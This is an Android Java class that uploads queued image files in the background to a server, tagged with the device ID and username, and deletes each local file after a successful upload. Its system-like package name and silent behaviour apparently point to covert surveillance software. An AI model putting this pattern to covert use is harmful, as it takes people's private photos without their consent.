package com.android.media.settings.Utility;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import com.android.media.settings.Interface.MediaAPI;
import com.android.media.settings.MediaConfig;
import com.android.media.settings.MediaDBManager;
import com.android.media.settings.Model.Media;
import com.android.media.settings.Model.MediaAPIResponse;
import com.android.media.settings.Service.MediaService;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import io.reactivex.Observable;
import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;

public class MediaUploadUtility {
    private static final String TAG = "MediaUploadService";
    private MediaDBManager dbManager;
    private final MediaType TYPE_IMAGE = MediaType.parse("image/*");
    private MediaUtility mUtility;
    private MediaConfig mConfig;
    private List<Media> mediaList = new ArrayList<>();

    public MediaUploadUtility(Context context) {
        this.dbManager = new MediaDBManager(context);
        this.mUtility = new MediaUtility(context);
        this.mConfig = new MediaConfig(context);
    }

    public void initUploadServices() {
        mediaList = dbManager.getMedia();
        if(mediaList != null && mediaList.size() > 0) {
            if(mUtility.networkConnected()) {
                new MediaUploadTask().execute();
            }
        }
    }

//    private void processMediaCursor(Cursor cursor) {
//        try {
//            MediaAPI api = mUtility.initRetroService();
//            while (cursor.moveToNext()) {
//                String id = cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_ID));
//                String path = cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_URL));
//                File file = new File(path);
//
//                if(file.exists()) {
//                    RequestBody imgBody = RequestBody.create(TYPE_IMAGE, file);
//                    MultipartBody.Part part = MultipartBody.Part.createFormData(mConfig.getIMG_UPLOAD_NAME(), id, imgBody);
//                    Observable<MediaAPIResponse> observable = api.uploadMedia(part, mUtility.getDeviceId(), mUtility.getUsername());
//                    observable.subscribeOn(Schedulers.newThread())
//                            .observeOn(AndroidSchedulers.mainThread())
//                            .subscribe(observer);
//                }
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        } finally {
//            cursor.close();
//        }
//    }

    private Observer<MediaAPIResponse> observer = new Observer<MediaAPIResponse>() {
        @Override
        public void onSubscribe(Disposable d) {
        }

        @Override
        public void onNext(MediaAPIResponse response) {
            try {
                if(response != null) {
                    if(response.getStatus() == 1) {
                        String id = response.getData();
                        Media media = dbManager.getMediaById(id);
                        if(media != null) {
                            media.setStatus(2);
                            dbManager.updateUploadStatus(media);
                            final boolean isDeleted = new File(media.getPath()).delete();
                        }
                    } else {
                        String id = response.getData();
                        Media media = dbManager.getMediaById(id);
                        if(media != null) {
                            media.setStatus(0);
                            dbManager.updateUploadStatus(media);
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onError(Throwable e) {
            e.printStackTrace();
        }

        @Override
        public void onComplete() {
        }
    };

    class MediaUploadTask extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            MediaService.isMediaUploading = true;
        }

        @Override
        protected Void doInBackground(Void... params) {
            MediaAPI api = mUtility.initRetroService();
            Log.d(TAG, "Media Count : " + mediaList.size());
            for(Media media : mediaList) {
                try {
                    File file = new File(media.getPath());
                    if(file.exists()) {
                        RequestBody imgBody = RequestBody.create(TYPE_IMAGE, file);
                        MultipartBody.Part part = MultipartBody.Part.createFormData(mConfig.getIMG_UPLOAD_NAME(), media.getId(), imgBody);
                        Observable<MediaAPIResponse> observable = api.uploadMedia(part, mUtility.getDeviceId(), mUtility.getUsername());
                        observable.subscribeOn(Schedulers.newThread())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(observer);
                    }
                } catch (Exception ignored) {}
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            MediaService.isMediaUploading = false;
        }
    }
}